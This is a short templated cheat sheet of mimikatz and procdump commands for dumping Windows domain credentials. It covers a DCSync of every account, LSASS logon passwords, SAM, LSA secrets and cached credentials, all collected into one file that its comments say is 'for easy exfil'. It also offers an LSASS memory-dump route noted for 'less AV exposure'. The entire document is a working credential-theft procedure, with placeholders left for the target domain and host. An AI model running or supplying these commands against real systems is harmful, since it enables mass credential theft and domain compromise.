# === CREDENTIAL DUMP - THREE COMMAND FULL EXTRACTION ===
# Run all three - outputs to single file for easy exfil
# 1. DCSync all accounts (requires DA or replication rights)
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::dcsync /domain:{{DOMAIN}} /all /csv" "exit" > C:\temp\creds_{{TARGET}}.txt
# 2. LSASS logon passwords (currently logged-in users, plaintext if WDigest enabled)
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit" >> C:\temp\creds_{{TARGET}}.txt
# 3. SAM + LSA secrets + cached domain creds
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "lsadump::secrets" "lsadump::cache" "exit" >> C:\temp\creds_{{TARGET}}.txt
# Procdump alternative (less AV exposure) - parse on Kali
.\procdump.exe -ma lsass.exe lsass.dmp
.\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
